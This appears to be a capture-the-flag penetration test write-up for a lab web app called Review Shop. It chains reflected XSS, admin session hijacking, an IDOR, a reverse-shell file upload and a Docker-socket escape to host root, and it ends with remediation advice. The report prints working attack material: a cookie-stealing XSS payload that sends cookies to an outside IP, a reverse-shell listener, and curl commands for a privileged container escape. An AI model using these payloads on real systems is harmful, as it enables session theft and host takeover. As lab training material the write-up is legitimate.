Web Application Penetration Test Report – Review Shop

Author: Marwan
Date: 2025
Assessment Type: Web Application Penetration Test
Impact: Full System Compromise

1. Executive Summary

During the penetration test of the Review Shop web application, multiple vulnerabilities were identified and chained together, resulting in a full compromise of the host system.

The assessment demonstrates how a seemingly low‑impact vulnerability (XSS) escalated—through lateral movement and authentication bypass—to Remote Code Execution (RCE) and ultimately a Docker escape, gaining root access over the entire host.

2. Scope

Target: review.thm

IP: 10.10.x.x

Services:

HTTP (80/tcp)

SSH (22/tcp)

3. Initial Reconnaissance
3.1 Port Scan (Nmap)
nmap -p- -vv -A -T3 -oA res review.thm


Findings:

Apache HTTP Server 2.4.41

PHP session cookie missing HttpOnly

Directory listing disabled

Potential file upload functionality

4. Directory Enumeration

Command:

gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://review.thm/ -x .php,.php.bak,.txt,.html


Key Findings:

/upload.php (empty/disabled)

/mails/ → contained a developer email dump

4.1 Sensitive Email Leak

The file revealed:

Two internal panels:

/finance.php on internal 192.x network

/lottery.php

Password hint for both: S6***5j

This information became critical later for access escalation.

5. Exploiting Reflected XSS – Moderator Compromise

The Contact page did not sanitize inputs properly.
Payload used:

<script>
var img = new Image();
img.src = 'http://10.10.47.10:8888/stealcookies?' + document.cookie;
</script>


A local HTTP server captured moderator cookies:

python3 -m http.server 8888


Cookies were successfully stolen:

PHPSESSID=d4e4dank4fm26823il0af6vj76
PHPSESSID=4osi19v6cbcl7f4gget27mm5j7
PHPSESSID=mo07n1d44tetqmtrcknl6ge0ko


This granted moderator panel access.

6. Social Engineering → Admin Session Hijacking

The moderator panel included a chat with an admin.

Since input sanitization prevented XSS in chat, a social engineering approach was used:

A malicious link was sent to the admin:

http://review.thm/admin_view.php


The admin opened the link, triggering the payload from the compromised feedback page.

Admin cookie stolen:

PHPSESSID=391d5nla1dual6sjnbj10v4f1b


Result: Full Admin Privileges

7. Accessing Hidden Internal Panels (/finance.php)

The admin interface referenced /lottery.php.

Using Burp Suite, the request was modified:

From:

GET /lottery.php


To:

GET /finance.php


This bypass allowed access to the hidden finance panel where file upload functionality was discovered.

8. File Upload Bypass → Remote Code Execution (RCE)

Multiple bypasses were tested:

Image polyglot

Filename manipulation

Double extension

A reverse shell payload was embedded inside an image file.

Reverse Shell Used:
PHP PentestMonkey shell (modified):

$ip = '10.10.47.10';
$port = 9001;


Listener:

nc -lvnp 9001


Successful RCE granted a foothold inside a Docker container.

9. Privilege Escalation – Docker Escape

The container had write access to:

/var/run/docker.sock


This allowed creation of a privileged container with host filesystem mounted.

Commands Used

List images:

curl --unix-socket /var/run/docker.sock http://localhost/images/json


Create container:

curl -X POST --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"php:8.1-cli","Cmd":["/bin/sh"],"Tty":true,"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}' \
http://localhost/containers/create


Start container:

curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<ID>/start


Escape to host:

docker exec -it <ID> chroot /host /bin/bash

10. Full Host Compromise

Inside the host machine, navigating to /root/ revealed:

THM{roo*******D0n}


This confirmed complete takeover of the machine.

11. Root Cause Analysis
Primary Issues
Category	Vulnerability	Impact
Client-side	Reflected XSS	Session Hijacking
Authentication	Session not HttpOnly	Cookies Stealable
Information Disclosure	Email dump in /mails	Internal panel discovery
Access Control	IDOR (lottery → finance)	Hidden feature access
File Upload	No validation	RCE
Docker Misconfig	Writable Docker Socket	Full host takeover
12. Recommendations
12.1 Input Validation & Output Encoding

Implement strict server-side sanitization.

Use HTML escaping libraries.

Block <script> tags and dangerous attributes.

12.2 Session Security

Add HttpOnly, Secure, SameSite=Strict.

Regenerate session IDs on role changes.

12.3 Protect Sensitive Files

Move email logs outside webroot.

Enforce strict file permissions.

12.4 Fix IDOR & Access Control

Use proper authorization checks per endpoint.

Never rely on URL guessing.

12.5 Secure File Uploads

Use content-type checking, magic bytes, and extension whitelisting.

Store uploads outside document root.

12.6 Docker Security

Never expose writable Docker socket to web apps.

Disable Privileged containers.

Use AppArmor/SELinux profiles.

12.7 Monitoring & Logging

Implement security logs for:

strange uploads

admin panel access

container creation events

13. Conclusion

This assessment demonstrates how a low-impact XSS can escalate into complete system compromise when combined with weak authentication, insecure configurations, and poor Docker isolation.

Chaining vulnerabilities is a critical real-world skill, and the final outcome represents a full kill-chain compromise ending with root access on the host machine.